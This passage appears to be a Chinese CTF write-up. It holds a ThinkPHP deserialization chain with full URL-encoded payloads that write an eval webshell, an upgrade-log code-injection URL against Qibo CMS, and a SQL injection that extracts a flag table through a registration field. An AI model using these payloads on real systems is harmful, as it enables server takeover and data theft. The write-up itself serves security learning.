    namespace think\model\relation {
        abstract class OneToOne
        {
            protected $selfRelation;
            protected $bindAttr = [];
            protected $query;
            function __construct($query)
            {
                $this->selfRelation = 0;
                $this->query = $query;    //$query指向Query
                $this->bindAttr = ['xxx'];// $value值，作为call函数引用的第二变量
            }
        }
    }
    namespace think\db {
        class Query {
            protected $model;
            function __construct($model)
            {
                $this->model = $model; //$this->model=> think\console\Output;
            }
        }
    }
    namespace think\console{
        class Output{
            private $handle;
            protected $styles;
            function __construct($handle)
            {
                $this->styles = ['getAttr'];
                $this->handle =$handle; //$handle->think\session\driver\Memcached
            }
        }
    }
    namespace think\session\driver {
        class Memcached
        {
            protected $handler;
            function __construct($handle)
            {
                $this->handler = $handle; //$handle->think\cache\driver\File
            }
        }
    }
    namespace think\cache\driver {
        class File
        {
            protected $options=null;
            protected $tag;
            function __construct(){
                $this->options=[
                    'expire' => 3600,
                    'cache_subdir' => false,
                    'prefix' => '',
                    'path'  => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php',
                    'data_compress' => false,
                ];
                $this->tag = 'xxx';
            }
        }
    }
    namespace {
        $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());
        $Output = new think\console\Output($Memcached);
        $model = new think\db\Query($Output);
        $HasOne = new think\model\relation\HasOne($model);
        $window = new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));
        echo urlencode(serialize($window));
    }
    http://xxxxxxx/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A122%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
看起来已经走过反序列化这条语句了，执行成功了。
木马的文件名是 `a.php` 加上 `var_dump(md5('tag_'.md5('xxx')));` 的结果，也就是
`a.php12ac95f1498ce51d2d96a249c09c1998.php`
然而直接访问根目录下的这个文件 404 了……
后来发现是根目录下 www-data 用户没有写入权限，子目录下才有。
_（其实是在打法2才发现的 2333_
改一改 payload，写入到 runtime 目录下。记得改长度。
    http://xxxxxxx/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A130%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
生成的木马在 `/runtime/a.php12ac95f1498ce51d2d96a249c09c1998.php`，密码 `ccc`
* * *
**打法2 升级日志 RCE**
参考 Y4tacker 师傅的
[[代码审计]齐博建站系统x1.0企业版代码审计](https://blog.csdn.net/solitudi/article/details/119318403)
（Orz
`application/admin/controller/Upgrade.php`下的 `sysup` 函数在写入升级日志时直接拼接了 GET 参数中的
`upgrade_edition`，且写入的文件后缀为 `.php`
构造 payload
    ",""=>eval($_POST[%27miao%27])-"//
    原文中的是
    ",""=>-eval($_POST[%27yyds%27])-",];?>//
    http://xxxxx/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3Eeval($_POST[%27miao%27])-%22//
在  生成了一句话木马。
拼接后的文件内容为
    "",""=>eval($_POST['miao'])-"//","time"=>"2021-08-03 17:31",];
其实寻思着 payload 改成下面这个更好，拼接字符串不会报 warning 23333.
    ",""=>eval($_POST[%27miao%27])."//
###  安全,安全,还是xxx的安全
> 某个特别安全的商店
>
> **Hint:**
>  
>  
>     CREATE TABLE "users" (
>     "id" INTEGER NOT NULL,
>     "username" TEXT UNIQUE ,
>     "login_password" text,
>     "money" INTEGER,
>     "pay_password" TEXT,
>     "flag_num" INTEGER,
>     PRIMARY KEY ("id")
>     );
>
>
>     CREATE TABLE "flaaaaaaaaag" (
>     "flllllllag" TEXT
>     );
>  
**是个零解题。**
根据给的 hint 可以知道是要 **SQL 注入** 。
本来以为注入点在 购买 这里的 flag 数量上，然而并没有找到回显点，而且返回错误 Hacker 了。
参考 [erR0Ratao 师傅的
wp](https://www.cnblogs.com/erR0Ratao/p/15088223.html)，注入点在注册功能的
`pay_password` 处。
    var app = new Vue({
        el: '#app',
        data() {
            return {
                users: {
                    username: '',
                    password: '',
                    pay_password: ''
                },
                rules: {
                    username: [
                        {required: true, message: '请输入用户名', trigger: 'blur'},
                        {min: 3, max: 32, message: '长度在 3 到 32 个字符', trigger: 'blur'}
                    ],
                    password: [{required: true, message: '请输入登录密码', trigger: 'blur'}],
                    pay_password: [{required: true, message: '请输入支付密码', trigger: 'blur'}]
                },
                visibility: "visibility: hidden"
            }
        },
        methods: {
            onSubmit() {
                axios
                    .post('register', {
                        username: app.users.username,
                        password: md5(app.users.password+"CBCTF"),
                        pay_password: encrsa(app.users.pay_password)
                    })
                    .then(response => {
                        if (response.data.error) {
                            if (response.data.msg === "hacker!") {
                                this.visibility = "visibility: visible";
                            } else {
                                this.visibility = "visibility: hidden";
                            }
                            app.$message({
                                showClose: true,
                                message: response.data.msg,
                                type: 'error'
                            });
                        } else {
                            window.location.href = 'login'
                        }
                    })
                    .catch(function (error) { // 请求失败处理
                        console.log(error);
                    });
            },
        }
    });
    function encrsa(input) {
        const crypt = new JSEncrypt();
        const pub_key = "-----BEGIN PUBLIC KEY-----\n" +
            "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDK9H5CoNfCA0TR5e5w20Q9qmTW\n" +
            "3T1uWmLHmNu7id9VBsngYXbaNfcK01JK2NNLLQ74vbRTpnAFg05csCkUWnkloKKu\n" +
            "AZZEDxKaiZ6M4Vmy1BYae7lutS5uECYouZt+TveABrdM4pjPxBwoKpp+IJFeYsVX\n" +
            "UGzrDiFb40I47X6oRQIDAQAB\n" +
            "-----END PUBLIC KEY-----"
        crypt.setPublicKey(pub_key);
        return crypt.encrypt(md5(input+"CBCTF2021"))
    }
根据前端源码，对支付密码进行了 md5 => rsa => base64 的加密。
直接注入发现注不进去，考虑到有可能后端存的就是支付密码的 md5 结果，于是可以改一改这个 `encrsa` 函数，在 md5 之后、RSA 之前进行注入。
根据 hint，`pay_password` 后面还有一个 `flag_num` 字段，构造 payload 为
    0a8b5a33639258fd9476bb66d3b7202d',233)--    
登录之后可以发现改成功了。
于是再构造
    0a8b5a33639258fd9476bb66d3b7202d',hex((select flllllllag from flaaaaaaaaag)))--    
直接用浏览器在注册页面执行下面的 js 代码。
    function encrsa(input) {
        const crypt = new JSEncrypt();
        const pub_key = "-----BEGIN PUBLIC KEY-----\n" +
            "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDK9H5CoNfCA0TR5e5w20Q9qmTW\n" +
            "3T1uWmLHmNu7id9VBsngYXbaNfcK01JK2NNLLQ74vbRTpnAFg05csCkUWnkloKKu\n" +
            "AZZEDxKaiZ6M4Vmy1BYae7lutS5uECYouZt+TveABrdM4pjPxBwoKpp+IJFeYsVX\n" +
            "UGzrDiFb40I47X6oRQIDAQAB\n" +
            "-----END PUBLIC KEY-----"
        crypt.setPublicKey(pub_key);
        return crypt.encrypt("0a8b5a33639258fd9476bb66d3b7202d'," + input + ")--");
    }
    axios
        .post('register', {
            username: "miao",
            password: md5("miao" + "CBCTF"),
            // pay_password: encrsa("233")   // 在这里注入
            pay_password: encrsa("hex((select flllllllag from flaaaaaaaaag))")   // 在这里注入
        })
        .then(response => {
            if (response.data.error) {
                if (response.data.msg === "hacker!") {
                    this.visibility = "visibility: visible";
                } else {
                    this.visibility = "visibility: hidden";
                }
                app.$message({
                    showClose: true,
                    message: response.data.msg,
                    type: 'error'
                });